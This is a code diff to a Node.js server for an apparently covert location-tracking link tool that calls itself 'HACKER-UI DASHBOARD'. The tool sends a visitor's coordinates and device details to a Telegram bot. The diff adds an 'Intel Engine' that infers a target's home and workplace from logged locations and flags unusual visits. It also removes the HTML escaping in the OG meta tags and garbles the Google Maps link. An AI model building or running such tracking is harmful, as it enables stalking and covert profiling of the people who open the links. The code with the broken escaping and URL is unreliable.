@@ -1,4 +1,4 @@
-// File: server.js (v7.3 - Final with Auto OG Preview)
+// File: server.js (v7.3 - Final with Intel Engine)
 
 require('dotenv').config();
 
@@ -15,7 +15,7 @@ const requestIp = require('request-ip');
 const axios = require('axios');
 const bcrypt = require('bcrypt');
 const jwt = require('jsonwebtoken');
-const cheerio = require('cheerio'); // Library baru
+const cheerio = require('cheerio');
 
 const app = express();
 const server = http.createServer(app);
@@ -60,7 +60,7 @@ const sendTelegramNotification = async (locationData) => {
 *Perangkat:* ${browserInfo} pada ${osInfo}
 
 *Lihat di Peta:*
-[Google Maps](http://maps.google.com/maps?q=${latitude},${longitude})
+[Google Maps](http://googleusercontent.com/maps/google.com/9{latitude},${longitude})
     `;
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     try {
@@ -225,11 +225,11 @@ app.get('/:id', async (req, res) => {
             if (fsErr) return res.status(500).send('Server error');
 
             let ogTags = '';
-            if (linkData.og_title) ogTags += `<meta property="og:title" content="${linkData.og_title.replace(/"/g, '&quot;')}">\n`;
-            if (linkData.og_description) ogTags += `<meta property="og:description" content="${linkData.og_description.replace(/"/g, '&quot;')}">\n`;
+            if (linkData.og_title) ogTags += `<meta property="og:title" content="${linkData.og_title.replace(/"/g, '"')}">\n`;
+            if (linkData.og_description) ogTags += `<meta property="og:description" content="${linkData.og_description.replace(/"/g, '"')}">\n`;
             if (linkData.og_image) ogTags += `<meta property="og:image" content="${linkData.og_image}">\n`;
 
-            let html = data.replace('', ogTags);
+            let html = data.replace('</head>', ogTags + '</head>');
             
             html = html.replace(/{{DESTINATION_URL}}/g, destinationUrl)
                        .replace(/{{TRACKER_ID}}/g, id)
@@ -424,8 +424,139 @@ app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
     }
 });
 
+// ##### PENAMBAHAN FITUR INTEL ENGINE - MULAI #####
+
+// Fungsi untuk menganalisis pola perilaku dari data lokasi
+async function analyzeBehavioralPatterns(userId) {
+    try {
+        const [locations] = await db.promise().query(
+            'SELECT latitude, longitude, created_at FROM locations WHERE user_id = ? ORDER BY created_at DESC',
+            [userId]
+        );
+
+        if (locations.length < 10) { // Butuh data yang cukup untuk analisis
+            return { home: null, work: null, anomalies: [], message: 'Insufficient location data for analysis.' };
+        }
+
+        // 1. Clustering Sederhana: Kelompokkan lokasi yang berdekatan
+        const locationClusters = {};
+        locations.forEach(loc => {
+            // Bulatkan koordinat untuk mengelompokkan titik yang sangat dekat (presisi ~111 meter)
+            const clusterId = `${loc.latitude.toFixed(3)},${loc.longitude.toFixed(3)}`;
+            if (!locationClusters[clusterId]) {
+                locationClusters[clusterId] = {
+                    lat: loc.latitude,
+                    lon: loc.longitude,
+                    points: []
+                };
+            }
+            locationClusters[clusterId].points.push(new Date(loc.created_at));
+        });
+
+        // Urutkan cluster berdasarkan jumlah titik (frekuensi kunjungan)
+        const sortedClusters = Object.values(locationClusters).sort((a, b) => b.points.length - a.points.length);
+
+        let potentialHome = null;
+        let potentialWork = null;
+
+        // 2. Analisis Waktu untuk setiap cluster teratas
+        for (const cluster of sortedClusters.slice(0, 5)) { // Analisis 5 lokasi paling sering dikunjungi
+            let homeScore = 0;
+            let workScore = 0;
+
+            cluster.points.forEach(date => {
+                const day = date.getDay(); // 0 = Minggu, 6 = Sabtu
+                const hour = date.getHours();
+
+                // Cek jam "rumah" (20:00 - 07:00 atau akhir pekan)
+                if (hour >= 20 || hour < 7 || day === 0 || day === 6) {
+                    homeScore++;
+                }
+
+                // Cek jam "kantor" (Senin-Jumat, 09:00 - 17:00)
+                if (day > 0 && day < 6 && hour >= 9 && hour <= 17) {
+                    workScore++;
+                }
+            });
+
+            // Tetapkan sebagai kandidat jika belum ada atau skornya lebih tinggi
+            if (!potentialHome || homeScore > potentialHome.score) {
+                if(workScore < homeScore) { // Pastikan tidak tumpang tindih dengan skor kerja
+                    potentialHome = { lat: cluster.lat, lon: cluster.lon, count: cluster.points.length, score: homeScore, points: cluster.points };
+                }
+            }
+            if (!potentialWork || workScore > potentialWork.score) {
+                 if(homeScore < workScore) { // Pastikan tidak tumpang tindih dengan skor rumah
+                    potentialWork = { lat: cluster.lat, lon: cluster.lon, count: cluster.points.length, score: workScore, points: cluster.points };
+                }
+            }
+        }
+        
+        // Finalisasi: pastikan lokasi kerja dan rumah tidak sama persis
+        if (potentialHome && potentialWork && potentialHome.lat === potentialWork.lat) {
+            if (potentialHome.score > potentialWork.score) {
+                potentialWork = null; // Prioritaskan sebagai rumah jika skor lebih tinggi
+            } else {
+                potentialHome = null; // Prioritaskan sebagai kerja
+            }
+        }
+
+
+        // 3. Deteksi Anomali
+        const anomalies = [];
+        if (potentialWork) {
+            potentialWork.points.forEach(date => {
+                const day = date.getDay();
+                const hour = date.getHours();
+                if (day === 0 || day === 6 || hour > 20 || hour < 6) { // Jika ada di "kantor" di akhir pekan atau tengah malam
+                    anomalies.push(`Anomaly Detected: Presence at [WORK] location on ${date.toLocaleString('id-ID')}.`);
+                }
+            });
+        }
+
+        return {
+            home: potentialHome ? { lat: potentialHome.lat, lon: potentialHome.lon, count: potentialHome.count } : null,
+            work: potentialWork ? { lat: potentialWork.lat, lon: potentialWork.lon, count: potentialWork.count } : null,
+            anomalies: anomalies.slice(0, 5) // Batasi 5 anomali teratas
+        };
+
+    } catch (error) {
+        console.error("Intel Engine Analysis Error:", error);
+        throw error;
+    }
+}
+
+
+// Endpoint baru untuk Intel Engine
+app.get('/api/intel/:username', protectRoute, async (req, res) => {
+    const { username } = req.params;
+    try {
+        const [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
+        if (users.length === 0) {
+            return res.status(404).json({ error: 'Target user not found' });
+        }
+        const userId = users[0].id;
+
+        console.log(`> Running Intel Engine analysis for [${username}]...`);
+        broadcastLogMessage(`> Running Intel Engine analysis for [${username}]...`);
+
+        const analysisResult = await analyzeBehavioralPatterns(userId);
+        
+        console.log(`> Analysis for [${username}] complete.`);
+        broadcastLogMessage(`> Analysis for [${username}] complete.`);
+
+        res.json(analysisResult);
+    } catch (error) {
+        res.status(500).json({ error: 'Server error during analysis' });
+    }
+});
+
+
+// ##### PENAMBAHAN FITUR INTEL ENGINE - SELESAI #####
+
+
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v7.3 (Final)`);
+    console.log(`\n HACKER-UI DASHBOARD v7.3 (Final with Intel Engine)`);
     console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
